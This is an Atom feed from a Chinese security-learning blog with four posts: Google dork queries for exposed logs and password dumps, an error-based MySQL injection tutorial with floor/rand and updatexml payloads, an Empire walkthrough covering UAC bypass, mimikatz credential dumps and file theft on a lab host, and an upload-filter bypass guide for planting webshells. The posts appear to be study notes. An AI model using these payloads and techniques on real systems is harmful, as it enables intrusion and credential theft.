<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J_drops</title>
  <subtitle>人生没有白走的路，每一步都算数</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-09-11T03:54:14.232Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Jdrops</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Google Hacking</title>
    <link href="http://yoursite.com/2017/09/11/Google-Hacking/"/>
    <id>http://yoursite.com/2017/09/11/Google-Hacking/</id>
    <published>2017-09-11T03:48:41.000Z</published>
    <updated>2017-09-11T03:54:14.232Z</updated>
    
    <content type="html"><![CDATA[<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><ol>
<li>inurl:/secure/attachment/ filetype:log OR filetype:txt</li>
<li>inurl:share.cgi?ssid=</li>
<li>ext:log inurl:”/pgadmin”</li>
<li>intitle:”Welcome to QNAP Turbo NAS”</li>
<li>“m.zippyshare.com/“</li>
<li>inurl:_vti_pvt/administrators.pwd</li>
<li>“– Account dump” ext:sql -git</li>
<li>inurl:zabbix.php AND intext:”Zabbix SIA”</li>
<li>inurl:front/central.php</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;列表&quot;&gt;&lt;a href=&quot;#列表&quot; class=&quot;headerlink&quot; title=&quot;列表&quot;&gt;&lt;/a&gt;列表&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;inurl:/secure/attachment/ filetype:log OR filetype:txt&lt;/li&gt;
&lt;li&gt;
    
    </summary>
    
    
      <category term="google" scheme="http://yoursite.com/tags/google/"/>
    
  </entry>
  
  <entry>
    <title>报错型sql注入原理研究学习</title>
    <link href="http://yoursite.com/2017/09/11/%E6%8A%A5%E9%94%99%E5%9E%8Bsql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2017/09/11/报错型sql注入原理研究学习/</id>
    <published>2017-09-11T01:02:49.000Z</published>
    <updated>2017-09-11T03:04:33.730Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Mysql在执行语句的时候会抛出异常信息信息，而php+mysql架构的网站往往又将错误代码显示在页面上，这就让一些不法分子有机会从中获取敏感信息</p>
<h3 id="通过floor报错"><a href="#通过floor报错" class="headerlink" title="通过floor报错"></a>通过floor报错</h3><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><figure class="highlight q"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=<span class="number">1</span>' <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat(<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span>(<span class="keyword">select</span>(报错语句)) <span class="keyword">from</span> information_schema.tableslimit <span class="number">0</span>,<span class="number">1</span>))x <span class="keyword">from</span> imformation_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x)a)--+</div></pre></td></tr></table></figure>
<h4 id="公式解析"><a href="#公式解析" class="headerlink" title="公式解析"></a>公式解析</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">floor</span><span class="params">()</span></span>  是向下取整数</div><div class="line"></div><div class="line"><span class="function"><span class="title">rand</span><span class="params">()</span></span> 在<span class="number">0</span>和<span class="number">1</span>之间产生一个随机数</div><div class="line"></div><div class="line"><span class="function"><span class="title">rand</span><span class="params">(<span class="number">0</span>)</span></span>*<span class="number">2</span> 将取<span class="number">0</span>到<span class="number">2</span>的随机数</div><div class="line"></div><div class="line"><span class="function"><span class="title">floor</span><span class="params">(rand()</span></span>*<span class="number">2</span>) 有两条记录就会报错</div><div class="line"></div><div class="line"><span class="function"><span class="title">floor</span><span class="params">(rand(<span class="number">0</span>)</span></span>*<span class="number">2</span>) 记录需要<span class="number">3</span>条以上，且<span class="number">3</span>条以上必报错，返回的值是有规律的</div><div class="line"></div><div class="line"><span class="function"><span class="title">count</span><span class="params">(*)</span></span>是用来统计结果，相当于刷新一次结果</div><div class="line"></div><div class="line">group by 在对数据进行分组时会先看看虚表中有没有这个值，没有的话就插入  存在的话count(*)加<span class="number">1</span>，在使用group by 时floor(rand(<span class="number">0</span>)*<span class="number">2</span>)会被执行一次，若虚表不存在记录，插入虚表会在执行一次</div></pre></td></tr></table></figure>
<h4 id="报错过程"><a href="#报错过程" class="headerlink" title="报错过程"></a>报错过程</h4><ol>
<li>rand()用于产生一个0~1的随机数</li>
<li>floor()向下取整</li>
<li>rand()函数生成0~1的整数，向下取整，值是固定的’0’,将rand*2，得到的值就是不固定的，’0’或’1’</li>
<li>concat()将符合条件的同一列中的不同列数据拼接，0x3a是十六进制的”:”</li>
<li>将之前的rand()函数和floor()函数整合起来</li>
<li>查询名字太长，起一个别名</li>
<li>再次查询.information_schema.tables有多少表，会显示多少列</li>
<li>group by 依据我们想要的规矩对结果进行分组</li>
<li>count()统计元组的个数</li>
<li>接着，多重复几次</li>
</ol>
<h4 id="floor-rand-2-与floor-rand-0-2-的不确定性与确定性"><a href="#floor-rand-2-与floor-rand-0-2-的不确定性与确定性" class="headerlink" title="floor(rand()2)与floor(rand(0)2)的不确定性与确定性"></a>floor(rand()<em>2)与floor(rand(0)</em>2)的不确定性与确定性</h4><pre><code>floor(rand()*2)不加随机因子的时候是随机出错的，而在3条记录以上用floor(rand(0)*2)就一定报错，由此可猜想floor(rand()*2)是比较随机的，不具备确定性因素，而floor(rand(0)*2)具备某方面的确定性。

通过测试发现，floor(rand()*2)毫无规律可言，而floor(rand(0)*2）是有规律的

那么mysql在遇到`select count（*）from tables group by x`这句话（实际就是建立虚拟表）
1.先建立虚拟表，其中key是主键，不可重复
2.开始查询数据，取数据库数据，然后查看虚拟表存在不，不存在则插入新纪录，存在则count(*)字段直接加，即如果key存在就+1，不存在话就新建一个key

其实mysql官方有给过提示，就是查询的时候如果使用rand()的话，该值会被计算多次，那这个“被计算多次”到底是什么意思，就是在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下floor(rand(0)*2)报错的过程就知道了，从0x04可以看到在一次多记录的查询过程中floor(rand(0)*2)的值是定性的，为`011011…`(记住这个顺序很重要)，报错实际上就是floor(rand(0)*2)被计算多次导致的。
</code></pre><h4 id="完整过程"><a href="#完整过程" class="headerlink" title="完整过程"></a>完整过程</h4><ol>
<li>查询前默认建立空虚拟表</li>
<li>取第一条记录，执行floor(rand(0)<em>2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)</em>2)会被再计算一次，结果为1(第二次计算)，插入虚表，这是第一条记录</li>
<li>查询第二条记录，再次计算floor(rand(0)<em>2)，发现结果为1（第三次计算）,查询虚表，发现1的键值存在，所以floor(rand(0)</em>2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕</li>
<li>查询第三条记录，再次计算floor(rand(0)<em>2），发现结果为0(第四次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的的数据，再插入数据时floor(rand(0)</em>2)被再次计算，作为虚表的主键，其值为1（第5次计算)，然而1这个主键已经存在与虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了</li>
</ol>
<p>整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</p>
<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p>MySQL5.1.5版本中添加了对XML文档进行查询的修改的函数，分别是updatexml()和extracvalue()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; use test;</div><div class="line">Database changed</div><div class="line">mysql&gt; create table users</div><div class="line">    -&gt; (</div><div class="line">    -&gt; id int(3) NOT NULL AUTO_INCREMENT,</div><div class="line">    -&gt; username varchar(20) NOT NULL,</div><div class="line">    -&gt; password varchar(20) NOT NULL,PRIMARY KEY (id)</div><div class="line">    -&gt; );</div><div class="line">Query OK, 0 rows affected (1.74 sec)</div><div class="line"></div><div class="line">mysql&gt; insert into users(id,username,password) values (1,&apos;admin&apos;,&apos;123456&apos;);</div><div class="line">Query OK, 1 row affected (0.00 sec)</div></pre></td></tr></table></figure>
<p>执行报错的payload:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="section">mysql&gt; select 1,2,3 and updatexml(1,concat(null,(select @@version),null),1);</span></div><div class="line">+---+---+-----------------------------------------------------------+</div><div class="line"><span class="section">| 1 | 2 | 3 and updatexml(1,concat(null,(select @@version),null),1) |</span></div><div class="line">+---+---+-----------------------------------------------------------+</div><div class="line"><span class="section">| 1 | 2 |                                                      NULL |</span></div><div class="line">+---+---+-----------------------------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<p>报错原因：</p>
<ol>
<li>updatexml第二个参数需要的是Xpath格式的字符串，我们输入的格式显然不符合，故故障由此报错</li>
<li>uodatexml的最大长度是32位的，所以有局限（PS：但是应对大多的已经足够。）如果密码长度超过了32位就不会被显示出来。</li>
</ol>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ol>
<li><img src="http://wt7315.blog.51cto.com/10319657/1891458" alt=""></li>
<li><img src="http://www.jinglingshu.org/?p=4507" alt=""></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Mysql在执行语句的时候会抛出异常信息信息，而php+mysql架构的网站往往又将错误代码显示在页面上，这就让一些不法分子有机会从中获取敏
    
    </summary>
    
    
      <category term="sql" scheme="http://yoursite.com/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>域渗透神器Empire安装和简单使用</title>
    <link href="http://yoursite.com/2017/08/02/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8Empire%E5%AE%89%E8%A3%85%E5%92%8C%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2017/08/02/域渗透神器Empire安装和简单使用/</id>
    <published>2017-08-02T14:31:28.000Z</published>
    <updated>2017-08-02T17:01:37.984Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Empire简介"><a href="#1-Empire简介" class="headerlink" title="1. Empire简介"></a>1. Empire简介</h2><p>官网介绍如下：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Empire <span class="keyword">is</span> a pure PowerShell post-exploitation agent built <span class="keyword">on</span> cryptologically-secure communications <span class="keyword">and</span> a flexible architecture. Empire implements <span class="keyword">the</span> ability <span class="keyword">to</span> <span class="built_in">run</span> PowerShell agents <span class="keyword">without</span> needing powershell.exe, rapidly deployable post-exploitation modules ranging <span class="keyword">from</span> key loggers <span class="keyword">to</span> Mimikatz, <span class="keyword">and</span> adaptable communications <span class="keyword">to</span> evade network detection, all wrapped up <span class="keyword">in</span> a usability-focused framework</div></pre></td></tr></table></figure>
<p>关于内网渗透，我们平时基本第一时间想到Metasploit，集信息收集，预渗透，渗透，后渗透，木马，社会工程学于一体的平台，但是Empire就是针对内网的渗透，针对powershell，在内网渗透能用到的powershell脚本，全部集成在Empire框架中，其更是域渗透神器。网上关于其介绍的文章寥寥无几，尤其2.0版本，操作和之前的1.6版本等不管是命令啥的都有很大的区别，在网上查了很多外文文献，摸索了半天，在这里做一个笔记，和大家共同进步</p>
<h2 id="Empire安装"><a href="#Empire安装" class="headerlink" title="Empire安装"></a>Empire安装</h2><p>官网直接转到github下载<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/EmpireProject/Empire.git</div><div class="line"><span class="keyword">cd</span> Empire/</div><div class="line"><span class="keyword">cd</span> setup/</div><div class="line">sudo ./install.<span class="keyword">sh</span></div><div class="line"></div><div class="line">补充：（清除缓存）</div><div class="line"><span class="keyword">cd</span> Empire/</div><div class="line"><span class="keyword">cd</span> setup/</div><div class="line">./reset.<span class="keyword">sh</span></div></pre></td></tr></table></figure></p>
<p>运行后的页面如下：<br><img src="http://ofrdce5qv.bkt.clouddn.com/821.png" alt=""><br>我们可以清楚看到有267个模块，0个监听和0个代理</p>
<a id="more"></a>
<h2 id="2-简单的操作演示"><a href="#2-简单的操作演示" class="headerlink" title="2. 简单的操作演示"></a>2. 简单的操作演示</h2><p>Empire的listeners就是MSF的监听。就是创建一个监听载荷。Agents相当于MSF的会话sessions。理清这两个基本概念就容易继续搞事情了。</p>
<p>我们的flag是让Rpi打开监听，协议遵循http。然后生成一个dll载荷，生成一个powershell命令。诱骗目标执行。</p>
<ul>
<li>在命令行里输入listeners进入监听<br><img src="http://ofrdce5qv.bkt.clouddn.com/822.png" alt=""></li>
<li>info 查看需要设置的选项<br><img src="http://ofrdce5qv.bkt.clouddn.com/823.png" alt=""><br>由于篇幅原因，info下的具体信息就不在此罗列，里面的信息还是非常关键的</li>
<li>设置当前监听的名字,并用execute执行<br><img src="http://ofrdce5qv.bkt.clouddn.com/824.png" alt=""></li>
<li>生成载荷 main命令回到主菜单<br><img src="http://ofrdce5qv.bkt.clouddn.com/825.png" alt=""></li>
<li>设置listener，然后执行execute生成dll木马,存在/tmp/launcher.dll中<br><img src="http://ofrdce5qv.bkt.clouddn.com/826.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/827.png" alt=""><br>然后将刚刚生成的这么一串字符串放入目标(192.168.1.3)cmd运行。(此时我的HIPS弹出一个拦截，说powershell要联网)就返回一个agent。而那个cmd一闪而过。这就相当于得到一个MSF会话了<br><img src="http://ofrdce5qv.bkt.clouddn.com/828.png" alt=""></li>
<li>选择Jdrops进入会话,进入终端输入help查看可以使用的命令<br><img src="http://ofrdce5qv.bkt.clouddn.com/829.png" alt=""></li>
</ul>
<h2 id="3-目标简单探索"><a href="#3-目标简单探索" class="headerlink" title="3. 目标简单探索"></a>3. 目标简单探索</h2><p>在这里输入的命令如果不是这里面的命令的话，我们的命令会被解析为windows命令执行，并给回显。但是这里要注意了，每次写完一道命令敲下回车以后，不要感觉是没有回显，要稍等一下才会回显出来</p>
<p>agents 和 back 这两个命令在我们现在的情况来看是差不多的；back 是返回上级，而我们的上级是agents，当写agents的时候，也会回到agents文件</p>
<p>Bypassuac 是提权神级命令，敲完命令就提权，但是由于目标原因可以直接提权成功，我之前在win10测试不能成功<br><img src="http://ofrdce5qv.bkt.clouddn.com/8210.png" alt=""></p>
<ul>
<li>利用mimikatz读取成功hash，Empire有个很方便的地方，就是，我们不需要在mimikatz的回显中去寻找密码，它已经帮我们列举好了，我们只需要执行creds命令，密码就出来了<br><img src="http://ofrdce5qv.bkt.clouddn.com/82111.png" alt=""></li>
<li>sc命令 目标截图一张<br><img src="http://ofrdce5qv.bkt.clouddn.com/8212.png" alt=""></li>
<li>download目标主机文件<br><img src="http://ofrdce5qv.bkt.clouddn.com/8213.png" alt=""></li>
<li>利用upload命令往目标主机上传文件<br><img src="http://ofrdce5qv.bkt.clouddn.com/8215.png" alt=""></li>
<li>usemoudle命令，在目标靶机上弹窗</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">usemodule trollsploit/<span class="keyword">message</span></div></pre></td></tr></table></figure>
<p><img src="http://ofrdce5qv.bkt.clouddn.com/8216.png" alt=""></p>
<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>此时，已经0:50，简单总结学习的收获，Empire跟Metasploit一样，有强大的接口，可以方便于我们自己写payload，同时它就是针对powershell的内网渗透工具，虽然没有Metasploit那么强大的各种平台都能应对，但是单单针对windows（这次靶机是我随便开的一台windows7系统），以及域渗透的强大之处估计Metasploit不能比的。关于其具体实战域渗透，在近期会搭建学习，同时为下周培训做准备，就到这吧。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-Empire简介&quot;&gt;&lt;a href=&quot;#1-Empire简介&quot; class=&quot;headerlink&quot; title=&quot;1. Empire简介&quot;&gt;&lt;/a&gt;1. Empire简介&lt;/h2&gt;&lt;p&gt;官网介绍如下：&lt;/p&gt;
&lt;figure class=&quot;highlight applescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Empire &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; a pure PowerShell post-exploitation agent built &lt;span class=&quot;keyword&quot;&gt;on&lt;/span&gt; cryptologically-secure communications &lt;span class=&quot;keyword&quot;&gt;and&lt;/span&gt; a flexible architecture. Empire implements &lt;span class=&quot;keyword&quot;&gt;the&lt;/span&gt; ability &lt;span class=&quot;keyword&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;run&lt;/span&gt; PowerShell agents &lt;span class=&quot;keyword&quot;&gt;without&lt;/span&gt; needing powershell.exe, rapidly deployable post-exploitation modules ranging &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; key loggers &lt;span class=&quot;keyword&quot;&gt;to&lt;/span&gt; Mimikatz, &lt;span class=&quot;keyword&quot;&gt;and&lt;/span&gt; adaptable communications &lt;span class=&quot;keyword&quot;&gt;to&lt;/span&gt; evade network detection, all wrapped up &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; a usability-focused framework&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;关于内网渗透，我们平时基本第一时间想到Metasploit，集信息收集，预渗透，渗透，后渗透，木马，社会工程学于一体的平台，但是Empire就是针对内网的渗透，针对powershell，在内网渗透能用到的powershell脚本，全部集成在Empire框架中，其更是域渗透神器。网上关于其介绍的文章寥寥无几，尤其2.0版本，操作和之前的1.6版本等不管是命令啥的都有很大的区别，在网上查了很多外文文献，摸索了半天，在这里做一个笔记，和大家共同进步&lt;/p&gt;
&lt;h2 id=&quot;Empire安装&quot;&gt;&lt;a href=&quot;#Empire安装&quot; class=&quot;headerlink&quot; title=&quot;Empire安装&quot;&gt;&lt;/a&gt;Empire安装&lt;/h2&gt;&lt;p&gt;官网直接转到github下载&lt;br&gt;&lt;figure class=&quot;highlight vim&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;git clone http&lt;span class=&quot;variable&quot;&gt;s:&lt;/span&gt;//github.&lt;span class=&quot;keyword&quot;&gt;com&lt;/span&gt;/EmpireProject/Empire.git&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;cd&lt;/span&gt; Empire/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;cd&lt;/span&gt; setup/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sudo ./install.&lt;span class=&quot;keyword&quot;&gt;sh&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;补充：（清除缓存）&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;cd&lt;/span&gt; Empire/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;cd&lt;/span&gt; setup/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./reset.&lt;span class=&quot;keyword&quot;&gt;sh&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;运行后的页面如下：&lt;br&gt;&lt;img src=&quot;http://ofrdce5qv.bkt.clouddn.com/821.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;我们可以清楚看到有267个模块，0个监听和0个代理&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞总结</title>
    <link href="http://yoursite.com/2017/07/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2017/07/17/文件上传漏洞总结/</id>
    <published>2017-07-17T08:25:16.000Z</published>
    <updated>2017-07-18T07:05:01.776Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>   文件上传漏洞可以说是日常渗透测试中用得最多的一个漏洞，用它获得服务器权限最快最直接。在Web程序中，经常需要用到文件上传的功能。如用户或者管理员上传图片，或者其它文件。如果没有限制上传类型或者限制不严格被绕过，就有可能造成文件上传漏洞。如果上传了可执行文件或者网页脚本，就会导致网站被控制甚至服务器沦陷。，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权或结合文件包含漏洞。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。</p>
<h2 id="2-上传检测流程"><a href="#2-上传检测流程" class="headerlink" title="2. 上传检测流程"></a>2. 上传检测流程</h2><p>  通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：<br><img src="http://ofrdce5qv.bkt.clouddn.com/1.png" alt=""></p>
<a id="more"></a>
<ul>
<li>客户端javascript校验（一般只校验文件的扩展名）</li>
</ul>
<ul>
<li>服务端校验<ul>
<li>文件头content-type字段校验（image/gif）</li>
<li>文件内容头校验（GIF89a）</li>
<li>目录路经检测（检测跟Path参数相关的内容）</li>
<li>文件扩展名检测 (检测跟文件 extension 相关的内容)</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
<li>自定义正则校验</li>
</ul>
</li>
<li>WAF设备校验（根据不同的WAF产品而定）</li>
</ul>
<h2 id="3-客户端校验"><a href="#3-客户端校验" class="headerlink" title="3. 客户端校验"></a>3. 客户端校验</h2><p>  这类检测通常在上传页面里含有专门检测文件上传的 javascript 代码 最常见的就是检测扩展名是否合法，有白名单形式也有黑名单形式。</p>
<ul>
<li>这类检测，通常是在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测扩展名是否合法，示例代码如下：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">function CheckFileType()</div><div class="line">&#123;</div><div class="line">    var objButton=document.getElementById("Button1");//上传按钮</div><div class="line">    var objFileUpload=document.getElementById("FileUpload1");</div><div class="line">    var objMSG=document.getElementById("msg");//显示提示信息用DIV</div><div class="line">    var FileName=new String(objFileUpload.value);//文件名</div><div class="line">    var extension=new String(FileName.substring(FileName.lastIndexOf(".")+1,FileName.length));//文件扩展名</div><div class="line"></div><div class="line">    if(extension=="jpg"||extension=="JPG")//可以另行添加扩展名</div><div class="line">    &#123;</div><div class="line">        objButton.disabled=false;//启用上传按钮</div><div class="line">        objMSG.innerHTML="文件检测通过";</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        objButton.disabled=true;//禁用上传按钮</div><div class="line">        objMSG.innerHTML="请选择正确的文件上传";</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，(进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测））内容如：只允许传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</li>
</ul>
<p>绕过方法：</p>
<ul>
<li>将需要上传的恶意代码文件类型改为允许上传的类型，例如将shell.asp改为shell.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名shell.jpg改为shell.asp</li>
<li>上传页面，审查元素，修改JavaScript检测函数（具体方法：可以使用firbug之类的插件把它禁掉）</li>
</ul>
<h2 id="4-服务端检测"><a href="#4-服务端检测" class="headerlink" title="4. 服务端检测"></a>4. 服务端检测</h2><h3 id="4-1-服务端MIME类型检测"><a href="#4-1-服务端MIME类型检测" class="headerlink" title="4.1. 服务端MIME类型检测"></a>4.1. 服务端MIME类型检测</h3><p>MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</p>
<p>服务器端检测文件MIME类型可能的代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">$uploaddir = <span class="string">'./'</span>;</div><div class="line">$uploadfile = $uploaddir . basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $uploadfile))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<ul>
<li>绕过方法</li>
</ul>
<p>配置Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170717173714.png" alt=""><br>然后在对应目录生成shell.jpg</p>
<h3 id="4-2-服务端目录路径检测"><a href="#4-2-服务端目录路径检测" class="headerlink" title="4.2. 服务端目录路径检测"></a>4.2. 服务端目录路径检测</h3><p><img src="http://ofrdce5qv.bkt.clouddn.com/3.png" alt=""></p>
<ul>
<li>上传的数据包中，如果存在path(或者其他名称)等能够操作上传路径的参数，修改该参数配合解析漏洞Get Webshell,测试代码</li>
<li>条件：php版本5.3.4以下；gpc关闭</li>
</ul>
